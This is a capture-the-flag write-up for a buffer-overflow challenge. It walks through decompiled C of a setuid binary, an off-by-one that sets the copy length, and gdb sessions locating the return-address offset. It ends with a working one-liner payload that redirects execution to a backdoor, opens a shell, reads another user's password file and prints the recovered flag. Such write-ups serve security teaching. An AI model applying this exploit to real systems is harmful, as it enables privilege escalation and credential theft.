# 09 - Buffer overflow (2)
> README by [jchene](https://github.com/jchene)

We have a binary named level09 at /home/users/level09/

It is owned by `level09` and has a `setuid bit`

The program is divided in 5 small functions: `main` `handle_msg` `set_username` `set_msg` and `secret_backdoor`

The `main` function only prints a text and calls the `handle_msg` function before returninc
int main(void)
{
    puts(
        "--------------------------------------------\n"
        "|   ~Welcome to l33t-m$n ~    v1337        |\n"
        "--------------------------------------------");
    handle_msg();
    return 0;
}
```

The `handle_msg` function first define some space in memory and initialise it, then calls the `set_username` and `set_msg` with the memory starting address as argument brefore printing and returning

```c
int handle_msg()
{
    char v1[140];
    int v2;
    int v3;
    int v4;
    int v5;
    int v6;
    int v7;

    v2 = 0;
    v3 = 0;
    v4 = 0;
    v5 = 0;
    v6 = 0;
    v7 = 140;
    set_username((int)v1);
    set_msg((int)v1);
    return puts(">: Msg sent!");
}
```

The `set_username` function reads 128 bytes on the standard input and copies the 41 first characters (41 bytes) into the memory at `memStart + 140`

```c
int set_username(int memStart)
{
    char username[140];
    int i;

    memset(username, 0, 128);
    puts(">: Enter your username");
    printf(">>: ");
    fgets(username, 128, stdin);
    for (i = 0; i <= 40 && username[i]; ++i)
        *(char *)(memStart + i + 140) = username[i];
    return printf(">: Welcome, %s", (const char *)(memStart + 140));
}
```

The `set_msg` function reads 1024 bytes from the standard input and copies `len` characters into the memory starting at memStart

`len` is a int located at memStart + 180

```c
char *set_msg(int memStart)
{
    char msg[1024];
    int len;

    memset(msg, 0, sizeof(msg));
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(msg, 1024, stdin);
    len = *(int *)(memStart + 180);
    return strncpy((char *)memStart, msg, len);
}
```

Finally the `secret_backdoor` function reads a 128 bytes long command inside the standard input and executes it using `system`

```c
int secret_backdoor()
{
    char command[128];

    fgets(command, 128, stdin);
    return system(command);
}
```

To better understand the memory management here let's take a look at `handle_msg` memory space:

```c
    char v1[140];
    int v2;
    int v3;
    int v4;
    int v5;
    int v6;
    int v7;

    v2 = 0;
    v3 = 0;
    v4 = 0;
    v5 = 0;
    v6 = 0;
    v7 = 140;
```

We have 140 bytes inside v1 (char size = 1 byte) and 8 bytes inside each of the 6 int (int64 size = 8 bytes) for a total of 140 + 48 = 188 bytes

The first 140 bytes are used to store the message

```c
//from set_msg
return strncpy((char *)memStart, msg, len);
```

The next 40 bytes sould be used to store the username

```c
//from set_username
for (i = 0; i <= 40 && username[i]; ++i)
    *(char *)(memStart + i + 140) = username[i];
```

And the last 8 bytes are used to store the length of the message

```c
//from main
v7 = 140;
//from set_msg
len = *(int *)(memStart + 180);
```

We can observe a small mistake inside the `set_username` function

The `for` loop copies 41 bytes instead of 40 because of the `<=` symbol which means we can overflow the `username` buffer to modify the length copied inside the `msg` buffer which can lead to another overflow

Maybe we can use this to overwrite the `handle_msg` return address to the address of the `secret_backdoor`

Let's use `gdb` to prove this flaw

First let's get the address of the `secret_backdoor` function

```
(gdb) info funct secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```

Now let's try to overwrite the `len`, we will input 40 'a' and a 'Z' character (dec 90, hex 5A) inside the username and look if the `strncpy` parameter was changed

```
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ
```

```
(gdb) disas
Dump of assembler code for function set_msg:
...
=> 0x00005555555549c6 <+148>:   callq  0x555555554720 <strncpy@plt>
```

```
(gdb) info reg
rdx            0x5a     90
```

The third parameter of `strncpy` (`rdx`) was modified successfully now we can try to overflow the `msg` buffer and overwrite the return address of `handle_msg`

```
Breakpoint 1, 0x00005555555548c4 in handle_msg ()
(gdb) disas
Dump of assembler code for function handle_msg:
...
   0x0000555555554931 <+113>:   retq

(gdb) b*0x0000555555554931
Breakpoint 2 at 0x555555554931

(gdb) r < <(python -c "print(40*'a'+'\xff'+300*'b')")

Breakpoint 5, 0x0000555555554931 in handle_msg ()
(gdb) info frame
 rip = 0x555555554931 in handle_msg; saved rip 0x6262626262626262
```

It worked now we can fuzz and find the right offset before inserting the address

In this case the offset is 286, let's try to insert the `secret_backdoor` address

```
Breakpoint 1, 0x00005555555548c4 in handle_msg ()
(gdb) disas
Dump of assembler code for function handle_msg:
...
   0x0000555555554931 <+113>:   retq

(gdb) b*0x0000555555554931
Breakpoint 2 at 0x555555554931

(gdb) r < <(python -c "print(40*'a'+'\xff'+286*'b' +'\x8c\x48\x55\x55\x55\x55\x00')")

Breakpoint 5, 0x0000555555554931 in handle_msg ()
(gdb) info frame
 rip = 0x555555554931 in handle_msg; saved rip 0x55555555488c
```

We have successfully replaced the return address, we can confirm it leads us to the `secret_backdoor` function

```
(gdb) set step-mode on
(gdb) s
0x000055555555488c in secret_backdoor ()
```

Now we can exploit that in real mode

```
level09@OverRide:~$ (python -c "print(40*'a'+'\xff'+286*'b'+'\x8c\x48\x55\x55\x55\x55\x00')"; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

The flag is here

```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
